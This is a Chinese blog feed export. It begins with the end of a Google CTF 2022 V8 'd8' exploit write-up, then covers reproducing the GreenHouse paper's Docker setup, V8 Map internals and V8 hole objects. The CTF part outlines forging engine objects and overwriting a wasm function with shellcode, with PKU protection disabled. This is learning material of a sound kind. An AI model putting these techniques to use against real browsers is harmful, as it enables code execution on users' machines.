<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">victim</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">const</span> o = [[], <span class="number">1.1</span>, <span class="number">0x123</span>];</span><br><span class="line">        %<span class="title class_">DebugPrint</span>(o);</span><br><span class="line">        <span class="comment">// console.log(o);</span></span><br><span class="line">        <span class="keyword">return</span> o[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">target</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">// float number 0x4141414141414141</span></span><br><span class="line">        <span class="keyword">const</span> target_arr = [<span class="number">2261634.5098039214</span>, <span class="number">2261634.5098039214</span>, <span class="number">2261634.5098039214</span>, <span class="number">2261634.5098039214</span>];</span><br><span class="line">        %<span class="title class_">DebugPrint</span>(target_arr);</span><br><span class="line">        <span class="comment">// console.log[target_arr];</span></span><br><span class="line">        <span class="keyword">return</span> target_arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">target</span>();</span><br><span class="line"><span class="title function_">victim</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Finished!&quot;</span>)</span><br><span class="line"><span class="comment">// readline();</span></span><br><span class="line"><span class="comment">// ./d8 test.js --print-bytecode</span></span><br></pre></td></tr></table></figure>
<p>成功篡改ArrayBiolerplateDescription指向<code>0x???41414141</code>地址数据：</p>
<img src="/posts/dc9665bb/file-20250918100439920.png" class="">
<h3 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h3><p>具体步骤如下：</p>
<ol>
<li>准备一个足够大的double数组，并且其低32位的元素地址需要是固定的（V8指针压缩）。该数组用于提供伪造实例例如<code>ArrayBoilerplateDescription</code>, <code>FixedArray</code>, <code>Uint32Array</code>…（让其指向了constant number）</li>
<li>喷射低32位元素地址令其作为位于<code>FixedArray</code>后的越界读<code>FixedDoubleArray</code>。注意对于内置类型Map值是固定的。</li>
<li>调用victim函数，其<code>CreateArrayLiteral</code>指令已被修改来进行越界读，然后将其返回获取到伪造对象。</li>
<li>后续常规做法即可</li>
</ol>
<p>创建了big_array，其内容地址为0x1c2149，同时在foo函数后定义foo2创建内容为<code>0x1c2149</code>的<code>FixedDoubleArray</code>数组，其内容会位于<code>FixedArray</code>后，因此设置victim函数创建的数组可以溢出<code>ArrayBoilerplateDescription</code>到foo2定义的数组，然后指向0x1c2149。<br>foo2定义数组的constant elements地址</p>
<img src="/posts/dc9665bb/file-20250917104708378.png" class="">
<p>victim定义数组的ArrayBoilerplateDescription地址</p>
<img src="/posts/dc9665bb/file-20250917104745545.png" class="">
<p>通过伪造<code>ArrayBoilerplateDescription</code>使其指向受控的big_array后，目标数组定义为<code>[&#123;&#125;, 0x1337]</code>，指定第一个对象为{a: wmain}，即定义的wasm函数，然后定义fake_object &#x3D; arr[0]获取其引用，然后其内容fake_object.a定义位于big_array中，因此可以控制其内容<br>然后定义了wasm函数并篡改其为shellcode并执行。<br>直接用作者提供的exp，发现会出现segmentation fault，界面如下：</p>
<img src="/posts/dc9665bb/file-20250910161632427.png" class="">
<p>可以发现执行到最后的写入shellcode时出现问题<br>似乎是这里的问题，现代cpu开了<a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/core-api/protection-keys.html">pku保护</a>。</p>
<img src="/posts/dc9665bb/file-20250915213208986.png" class="">
<p>关闭该保护对应的的flag标识即可</p>
<img src="/posts/dc9665bb/file-20250917102140585.png" class="">
<p>成功执行注入shellcode，执行了<code>/catflag</code></p>
<img src="/posts/dc9665bb/file-20250917150653692.png" class="">

<p>JIT优化的检查机制</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://mem2019.github.io/jekyll/update/2022/07/03/Google-CTF.html">Google CTF 2022 d8: From V8 Bytecode to Code Execution</a></li>
<li><a href="https://gist.github.com/pzread/2ceb4d507d23db91d83b3bfeb1a1f58b">Google CTF 2022 Pwn d8 Author’s Write-up</a></li>
<li><a href="https://v8.dev/blog/code-caching">Code caching</a></li>
<li><a href="https://github.com/thlorenz/v8-perf/blob/master/snapshots%2Bcode-caching.md">Snapshots and Code Caching</a></li>
<li><a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/core-api/protection-keys.html">内存保护密钥</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>GreenHouse论文复现</title>
    <url>/posts/5fc8128f.html</url>
    <content><![CDATA[<p>考虑复现一下该工作</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>Ubuntu 20.04</li>
<li>docker</li>
</ul>
<h2 id="Docker环境"><a href="#Docker环境" class="headerlink" title="Docker环境"></a>Docker环境</h2><p>使用清华源安装docker即可<br>设置docker build时的代理：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -t greenhouse --network host .</span><br></pre></td></tr></table></figure>
<p>修改Dockerfile内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM m.daocloud.io/docker.io/library/ubuntu:20.04</span><br><span class="line"></span><br><span class="line">ENV ALL_PROXY=&quot;http://127.0.0.1:7890&quot;</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注释掉该行，因为仓库里没有该文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">COPY ubuntu.tar /ubuntu.tar</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="Docker-Build"><a href="#Docker-Build" class="headerlink" title="Docker Build"></a>Docker Build</h2><p>进行编译，发现卡死在选择时区界面：</p>
<img src="/posts/5fc8128f/file-20250916173203553.png" class="">
<p>Dockerfile开头添加以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RUN export DEBIAN_FRONTEND=noninteractive \</span><br><span class="line">    &amp;&amp; apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y tzdata \</span><br><span class="line">    &amp;&amp; ln -fs /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span><br><span class="line">    &amp;&amp; dpkg-reconfigure --frontend noninteractive tzdata</span><br></pre></td></tr></table></figure>

<p>继续运行，发现报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">135.9 INFO: pip is looking at multiple versions of archinfo to determine which version is compatible with other requirements. This could take a while.</span><br><span class="line">136.5 ERROR: Package &#x27;archinfo&#x27; requires a different Python: 3.8.10 not in &#x27;&gt;=3.10&#x27;</span><br><span class="line">136.6 [!!] 17:50:41 pip failure (--no-build-isolation -e archinfo).</span><br></pre></td></tr></table></figure>
<p>该<a href="https://github.com/angr/angr-dev/issues/196">issue</a>说明了为archinfo更新，导致ubuntu20.04版本过低，先暂时注释掉该部分，后续build好后再补充</p>
<p>ChromeDriver下载错误，应该是以下命令拼接DRIVERVERSION失败，CHROMEVERSION修改为101.0.5112即可</p>
<img src="/posts/5fc8128f/file-20250917172835137.png" class="">

<h2 id="angr环境配置"><a href="#angr环境配置" class="headerlink" title="angr环境配置"></a>angr环境配置</h2><p>使用命令<code>docker run -itd greenhouse</code>创建容器，进入容器安装angr<br>将本地下载好的文件例如<code>archinfo, pyvex, cle...</code>等仓库(v9.2.55版本)复制到<code>/angr-dev</code>目录，然后运行之前注释的命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="variable">$REPO</span>: archinfo, pyvex, cle, claripy, ailment, angr, angr-doc, binaries</span></span><br><span class="line">git clone https://github.com/angr/$REPO &amp;&amp; cd $REPO</span><br><span class="line">git fetch --tags</span><br><span class="line">git checkout tags/v9.2.55 -b 9.2.55</span><br></pre></td></tr></table></figure>
<p>注意一下capstone版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install capstone==5.0.1</span><br></pre></td></tr></table></figure>
<p>后面还有一个pyelftools，本地源码安装好后注释掉即可<br>至此环境搭建完成（不过后来发现其实提供了docker image的XD）</p>
<h2 id="greenhouse复现"><a href="#greenhouse复现" class="headerlink" title="greenhouse复现"></a>greenhouse复现</h2><p>我们这里选择的手动运行Greenhouse，参考MANUAL.md<br>对应Artifact<a href="https://zenodo.org/api/records/8217895/files-archive">下载链接</a><br>也有相关的<a href="https://orgaworl.github.io/2024/10/07/Greenhouse-AE/">复现链接</a><br>运行以下命令导入image:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">只执行一次:</span></span><br><span class="line">docker load -i greenhouse-ae.tar  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每次启动容器都要执行:</span></span><br><span class="line">docker run -itd --privileged -v /dev:/host/dev greenhouse:usenix-eval-jul2023 bash </span><br><span class="line">/gh/docker_init.sh</span><br><span class="line">/gh/test.sh</span><br></pre></td></tr></table></figure>
<p>过程中可能遇到无法访问<code>docker daemon</code>的报错, 需要在容器中执行 <code>usermod -aG docker root</code>命令并重新启动容器.</p>
<p>这里参考文章里的华硕的固件模拟FirmAE在模拟时会出现卡死的问题。这里我又选择了之前提取过的一个信号放大器的固件，该固件内容比较简单。用来尝试验证效果。<br>似乎也会卡死。。。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/sefcom/greenhouse">GreenHouse</a></li>
<li><a href="https://zenodo.org/records/8217895">Greenhouse USENIX 2023 Artifact Evaluation</a></li>
<li><a href="https://orgaworl.github.io/2024/10/07/Greenhouse-AE/">GreenHouse AE</a></li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>V8 Map对象学习</title>
    <url>/posts/f97d3541.html</url>
    <content><![CDATA[<p>学习一下V8的Map对象，以下基本为对参考链接的文章的翻译转载。</p>
<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>ECMAScript 2015，也被成为ES6，引入了很多内置类型，例如Map、Set、WeakMap、WeakSet。他们是对标准JS库的扩展并在其他库，应用以及Node.js Core中广泛使用。今天我们关注于Map类型并且尝试去理解V8中的该类型实现细节，同时做一些总结。<br>规范并没有规定用于实现Map类型的精确算法，而是为可能的实现以及预期的性能特征提供了一些建议：</p>
<blockquote>
<p>Map object must be implemented using either hash tables or other mechanisms that, on average, provide access times that are sublinear on the number of elements in the collection. The data structures used in this Map objects specification is only intended to describe the required observable semantics of Map objects. It is not intended to be a viable implementation model.</p>
</blockquote>
<p>可以看到，该规范为实现保留了很大的空间。在Java中的Map类型存在多种实现接口，甚至可以微调该类型。<br>声明：该文章针对V8版本对8.4，以及Node.js（commit 238104c）</p>
<h2 id="底层算法概述"><a href="#底层算法概述" class="headerlink" title="底层算法概述"></a>底层算法概述</h2><p>首先，V8的Maps是建立在hash tables基础上实现的。以下假设你已经理解了hash tables是如何工作的。如果你不熟悉该概念，那么可以参考<a href="https://en.wikipedia.org/wiki/Hash_table">wiki</a>学习。<br>如果你对于Maps类型有足够的经验，那么你会发现一个矛盾。Hash tables不提供顺序保证，但是ES6规范要求提供插入顺序保证。因此经典的算法并不适合Maps，但是通过微调仍然可以实现。<br>V8使用“deterministic hash tables algorithm”来实现Maps。以下TypeScript伪代码展示了该算法的主要数据结构</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Entry</span> &#123;</span><br><span class="line">	<span class="attr">key</span>: <span class="built_in">any</span>;</span><br><span class="line">	<span class="attr">value</span>: <span class="built_in">any</span>;</span><br><span class="line">	<span class="attr">chain</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">CloseTable</span> &#123;</span><br><span class="line">	<span class="attr">hashTable</span>: <span class="built_in">number</span>[];</span><br><span class="line">	<span class="attr">dataTable</span>: <span class="title class_">Entry</span>[];</span><br><span class="line">	<span class="attr">nextSlot</span>: <span class="built_in">number</span>;</span><br><span class="line">	<span class="attr">size</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>CloseTable</code>接口表示hash table。其包含hashTable数组，其大小与buckets大小相同。数组第N个元素表示第N个bucket，并且在dataTable数组中维护了bucket头元素的index值。dataTable数组包含了以插入顺序排布的Entry元素。最终每个Entry有chain属性，其指向了在bucket链中的下一个entry。<br>每次一个新的entry插入到CloseTable时，其会存储在dataTable数组的<code>nextSlot</code>索引位置。还需要更新对应的bucket链，将插入的entry置于链末尾。<br>当一个entry从hash table中删除时，其从dataTable中删除（eg：将key和value设置为<code>undefined</code>）。注：删除元素仍然占据着<code>dataTable</code>的空间，不会进行释放回收。<br>最后一部分，当table装满时，会申请一个更大的空间，并进行重新哈希排布。<br>这样，遍历Map只需遍历dataTable数组。保证了Maps的有序性质。</p>
<h2 id="实际算法"><a href="#实际算法" class="headerlink" title="实际算法"></a>实际算法</h2><p>来一些例子来解释该算法是如何工作的。假设我们有一个包含两个buckets且总容量为4的<code>CloseTable</code>对象（hashTable.length&#x3D;2，datatable.length&#x3D;4）。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// let&#x27;s assume that we use identity hash function,</span></span><br><span class="line"><span class="comment">// i.e. function hashCode(n) &#123;return n;&#125;</span></span><br><span class="line">table.<span class="title function_">set</span>(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>); <span class="comment">// =&gt; bucket 0 (0 % 2)</span></span><br><span class="line">table.<span class="title function_">set</span>(<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>); <span class="comment">// =&gt; bucket 1 (1 % 2)</span></span><br><span class="line">table.<span class="title function_">set</span>(<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>); <span class="comment">// =&gt; bucket 0 (0 % 2)</span></span><br></pre></td></tr></table></figure>
<p>在该例子中，内部table的内容如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> tableInternals = &#123;</span><br><span class="line">	<span class="attr">hashTable</span>: [<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">	<span class="attr">dataTable</span>: [</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">		<span class="attr">chain</span>: <span class="number">2</span> <span class="comment">// index of &lt;2, &#x27;c&#x27;&gt;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span> <span class="comment">// means tail entry</span></span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">2</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="comment">// empty slot</span></span><br><span class="line">	],</span><br><span class="line">	<span class="attr">nextSlot</span>: <span class="number">3</span>, <span class="comment">// points to the empty slot</span></span><br><span class="line">	<span class="attr">size</span>: <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们删除一个entry（table.delete(0)），table内容如下：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> tableInternals = &#123;</span><br><span class="line">	<span class="attr">hashTable</span>: [<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">	<span class="attr">dataTable</span>: [</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="literal">undefined</span>, <span class="comment">// deleted entry</span></span><br><span class="line">		<span class="attr">value</span>: <span class="literal">undefined</span>,</span><br><span class="line">		<span class="attr">chain</span>: <span class="number">2</span></span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span> <span class="comment">// means tail entry</span></span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">2</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="comment">// empty slot</span></span><br><span class="line">	],</span><br><span class="line">	<span class="attr">nextSlot</span>: <span class="number">3</span>, <span class="comment">// points to the empty slot</span></span><br><span class="line">	<span class="attr">size</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们继续插入两个新的entry，hash table则需要进行rehash，申请更大内存。<br>Sets使用的算法与之类似。仅有的区别为Set类型不需要value属性。</p>
<h2 id="算法实现细节"><a href="#算法实现细节" class="headerlink" title="算法实现细节"></a>算法实现细节</h2><p>C++语言编写并暴露给JS代码使用。主要部分定义在<code>OrderdHashTable</code>和<code>OrderedHashMap</code>类中。<br>对应代码实现：</p>
<ul>
<li><a href="https://github.com/nodejs/node/blob/238104c531219db05e3421521c305404ce0c0cce/deps/v8/src/objects/ordered-hash-table.h">orderd-hash-table.h</a></li>
<li><a href="https://github.com/nodejs/node/blob/238104c531219db05e3421521c305404ce0c0cce/deps/v8/src/objects/ordered-hash-table.cc">orderd-hash-table.cc</a></li>
<li><a href="https://github.com/nodejs/node/blob/238104c531219db05e3421521c305404ce0c0cce/deps/v8/src/builtins/builtins-collections-gen.cc">buildins-collections-gen.cc</a></li>
</ul>
<h3 id="容量大小"><a href="#容量大小" class="headerlink" title="容量大小"></a>容量大小</h3><p>在V8中，hash table（Map）的大小总是2的指数倍。即表的最大容量为<code>2 * number_of_buckets</code>。当你创建一个空Map对象时，其hash table有两个buckets。因此其大小为4个entry。<br>最大容量有限制，在64位系统中最大为2^27，即不能超过16.7M个entries。<br>grow&#x2F;shrink因子则是2。每次double或除2.<br>作者添加了一些修改逻辑使得可以打印出Maps的容量。<br>运行以下script：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">let</span> prevBuckets = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">	<span class="keyword">if</span> (prevBuckets !== map.<span class="property">buckets</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`size: <span class="subst">$&#123;i&#125;</span>, buckets: <span class="subst">$&#123;map.buckets&#125;</span>, capacity: <span class="subst">$&#123;map.buckets * <span class="number">2</span>&#125;</span>`</span>);</span><br><span class="line">		prevBuckets = map.<span class="property">buckets</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	map.<span class="title function_">set</span>(&#123;&#125;, &#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果如下，验证上述增长过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">|$ ./node /home/puzpuzpuz/map-grow-capacity.js|</span><br><span class="line">|size: 0, buckets: 2, capacity: 4|</span><br><span class="line">|size: 5, buckets: 4, capacity: 8|</span><br><span class="line">|size: 9, buckets: 8, capacity: 16|</span><br><span class="line">|size: 17, buckets: 16, capacity: 32|</span><br><span class="line">|size: 33, buckets: 32, capacity: 64|</span><br><span class="line">|size: 65, buckets: 64, capacity: 128|</span><br></pre></td></tr></table></figure>
<p>map对象大小缩小也是同理：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">|<span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();|</span><br><span class="line">|<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;|</span><br><span class="line">|map.<span class="title function_">set</span>(i, i);|</span><br><span class="line">|&#125;|</span><br><span class="line">|<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`initial size: <span class="subst">$&#123;map.size&#125;</span>, buckets: <span class="subst">$&#123;map.buckets&#125;</span>, capacity: <span class="subst">$&#123;map.buckets * <span class="number">2</span>&#125;</span>`</span>);|</span><br><span class="line">||</span><br><span class="line">|<span class="keyword">let</span> prevBuckets = <span class="number">0</span>;|</span><br><span class="line">|<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;|</span><br><span class="line">|map.<span class="title function_">delete</span>(i);|</span><br><span class="line">|<span class="keyword">if</span> (prevBuckets !== map.<span class="property">buckets</span>) &#123;|</span><br><span class="line">|<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`size: <span class="subst">$&#123;map.size&#125;</span>, buckets: <span class="subst">$&#123;map.buckets&#125;</span>, capacity: <span class="subst">$&#123;map.buckets * <span class="number">2</span>&#125;</span>`</span>);|</span><br><span class="line">|prevBuckets = map.<span class="property">buckets</span>;|</span><br><span class="line">|&#125;|</span><br><span class="line">|&#125;|</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">|$ ./node /home/puzpuzpuz/map-shrink-capacity.js|</span><br><span class="line">|initial size: 100, buckets: 64, capacity: 128|</span><br><span class="line">|size: 99, buckets: 64, capacity: 128|</span><br><span class="line">|size: 31, buckets: 32, capacity: 64|</span><br><span class="line">|size: 15, buckets: 16, capacity: 32|</span><br><span class="line">|size: 7, buckets: 8, capacity: 16|</span><br><span class="line">|size: 3, buckets: 4, capacity: 8|</span><br><span class="line">|size: 1, buckets: 2, capacity: 4|</span><br></pre></td></tr></table></figure>

<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><p>迄今为止，我们还没有讨论V8如何计算key键值的哈希值。<br>对于数值类变量而言（Smis，heap类数值，大整数等等），使用低碰撞概率的<a href="https://github.com/nodejs/node/blob/238104c531219db05e3421521c305404ce0c0cce/deps/v8/src/utils/utils.h#L213">hash function</a><br>对于字符类值（字符串，符号），基于字符串内容计算hash<br>对于对象，基于一个随机数计算哈希值。</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>大多数Map操作，set、delete，需要查表，类似于哈希表，时间复杂度为O(1)。<br>rehashing操作为O(N)时间复杂度。</p>
<h3 id="内存占用"><a href="#内存占用" class="headerlink" title="内存占用"></a>内存占用</h3><p>保存在堆上。整个Map对象保存在一个固定长度的数组（一个元素占用8字节）上。数组由如下布局：</p>
<img src="/posts/f97d3541/file-20250909161516361.png" class="">
<p>头部包含了一些元数据信息。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df">[V8 Deep Dives] Understanding Map Internals</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>V8-Hole漏洞</title>
    <url>/posts/332a3199.html</url>
    <content><![CDATA[<p>对于V8 Hole相关内容的学习<br>V8 Map对象的分析可以看这篇搬运：<a href="2025-09-09-V8-Map%E5%AF%B9%E8%B1%A1%E5%AD%A6%E4%B9%A0.md">V8-Map对象</a></p>
<h2 id="V8源码分析"><a href="#V8源码分析" class="headerlink" title="V8源码分析"></a>V8源码分析</h2><p>在v8中，JSMap的内存布局如下：</p>
<img src="/posts/332a3199/file-20250909162249728.png" class="">
<ul>
<li>Map：每个对象会有的，包含对象属性的shape；</li>
<li>FixedArray Length：整个OrderdHashMap的大小</li>
<li>elements：存在的entry的数量</li>
<li>deleteds：删除的entry数量</li>
<li>buckets：buckets数量<br>考虑如下代码：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();  </span><br><span class="line">  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();  </span><br><span class="line">  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">2</span>, <span class="number">1</span>);  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">3</span>, <span class="number">1</span>);  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">4</span>, <span class="number">1</span>);  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();  </span><br><span class="line">  </span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">3</span>);  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();  </span><br><span class="line">  </span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">5</span>, <span class="number">1</span>);  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(map);  </span><br><span class="line"><span class="title function_">readline</span>();</span><br></pre></td></tr></table></figure>
调试查看内容如下：<br>第一次%DebugPrint(map)：<img src="/posts/332a3199/file-20250909164651651.png" class="">
查看其OrderedHashMap内容：<img src="/posts/332a3199/file-20250909165215831.png" class="">
可以发现其初始时elements和deleteds都是0，buckets为2。<br>hashTable为0xffffffff<br>dataTable则为0x2b0c3e9004d1（应该是未初始化），有12个，每个entry占3x8字节，因此总容量为4个entry。即2*buckets。<br>第二次添加四个元素后%DebugPrint(map)：<img src="/posts/332a3199/file-20250909165612954.png" class="">
elements变为4个<br>hashTable有0x2和0x3<br>dataTable对应内容为<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">2</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: -<span class="number">1</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">3</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: <span class="number">0</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="attr">key</span>: <span class="number">4</span>,</span><br><span class="line">		<span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">		<span class="attr">chain</span>: <span class="number">1</span>,</span><br><span class="line">	&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
似乎和前面的分析文章不同，将后来插入的放到了buckets的头部。<br>第三次删除（3,1）后%DebugPrint(map)：<img src="/posts/332a3199/file-20250909170244656.png" class="">
elements变为3，deleteds变为1<br>key&#x3D;3的位置变为undefined，也即是#hole，hashTable并没有改变。<br>用一下kanxue的参考文章作为示例：<img src="/posts/332a3199/file-20250909170430713.png" class="">
第四次添加新元素%DebugPrint(map)：<img src="/posts/332a3199/file-20250909170747446.png" class="">
可以发现OrderedHashMap发生变化，变成31长度，即发生扩容。<img src="/posts/332a3199/file-20250909170847420.png" class="">
扩容后buckets变为0x4，elements为4。<br>hashTable则变为了0x1, 0x0，0x3，然后发现dataTable内容中deleted_entry去除掉了。</li>
</ul>
<h3 id="map-set"><a href="#map-set" class="headerlink" title="map.set"></a>map.set</h3><p>map.set(key, value)的作用是给map添加元素。其接口处理逻辑如下：</p>
<ul>
<li>检查Key是否存在；</li>
<li>若不存在空闲entry，则进行扩容，然后填充entry；</li>
<li>若存在空闲的entry，则直接填充；</li>
<li>若key存在，则直接更新；</li>
<li>若key不存在，则检查是否存在空闲key<br>这里使用TryLookupOrderedHashTableIndex函数去寻找key对应的entry，及判断key是否存在：<br>对于不同类型的key，有着不同的寻找方式，这里以Smi类型的Key为例，对于Smi类型的Key寻找其entry利用的函数时FindOrderedHashTableEntryForSmiKey，该函数主要逻辑为利用ComputeIntegerHash计算Key的哈希值，然后再用FindOrderedHashTableEntry进行查找.</li>
</ul>
<h3 id="map-delete"><a href="#map-delete" class="headerlink" title="map.delete"></a>map.delete</h3><p>map.delete(key)作用为删除对应元素，其接口处理逻辑如下：</p>
<ul>
<li>删除对应key的entry，标记为已删除，修改entry的key，value为hole constant</li>
<li>修改elements，deleted值</li>
<li>查看elements是否小于buckets &#x2F; 2，如果是则进行shrink</li>
<li>rehash重新分配一个new_table</li>
</ul>
